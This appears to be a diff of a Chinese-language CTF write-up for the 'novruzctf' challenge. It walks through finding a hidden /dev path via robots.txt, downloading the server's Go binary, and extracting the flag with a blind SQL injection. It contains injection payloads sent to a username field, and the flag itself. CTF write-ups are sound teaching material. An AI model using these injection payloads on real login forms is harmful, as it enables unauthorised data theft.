@@ -11,7 +11,7 @@
 
 ## Flag
 
-```
+```text
 novruzctf{23546ca577fb70941f62da30bb93605fdd22f9d4d072b1674372b0be2cff7231}
 ```
 
@@ -30,7 +30,7 @@ novruzctf{23546ca577fb70941f62da30bb93605fdd22f9d4d072b1674372b0be2cff7231}
 
 检查 `robots.txt`，发现隐藏路径：
 
-```
+```text
 User-agent: *
 Disallow: /dev
 ```
@@ -39,13 +39,13 @@ Disallow: /dev
 
 访问 `/dev` 路径时，虽然页面内容与首页相同，但 **HTTP 响应头** 中暴露了关键信息：
 
-```
+```text
 Files: robots.txt, index.html, d4d02ab944e79608ee06b09d00eb1132
 ```
 
 直接访问 `/{hash}` 下载到一个 **10MB 的 Go 语言 ELF 二进制文件**——这就是服务端程序本身。
 
-```
+```text
 ELF 64-bit LSB executable, x86-64, Go BuildID=m-CL-sKHv10fF8tfBLOR/...
 ```
 
@@ -54,7 +54,7 @@ ELF 64-bit LSB executable, x86-64, Go BuildID=m-CL-sKHv10fF8tfBLOR/...
 由于是 Go 编译的未 strip 二进制，符号信息完整保留。
 
 **Go 函数列表：**
-```
+```text
 main.dev_handler
 main.download_handler
 main.index_handler
@@ -137,7 +137,7 @@ curl -d "username='+OR+secret>''--+&password=kerrev" → {+} Correct pass!
 
 **解决方案**：在比较字符串末尾添加 `~`（ASCII 126，非常高的字符），消除长度差异的影响：
 
-```
+```text
 secret > 'novruzctf{X~'
 ```
 
@@ -147,7 +147,7 @@ secret > 'novruzctf{X~'
 
 #### 注入 Payload
 
-```
+```text
 username: ' OR secret>'novruzctf{...已知前缀...}{测试字符}~'--
 password: kerrev
 ```
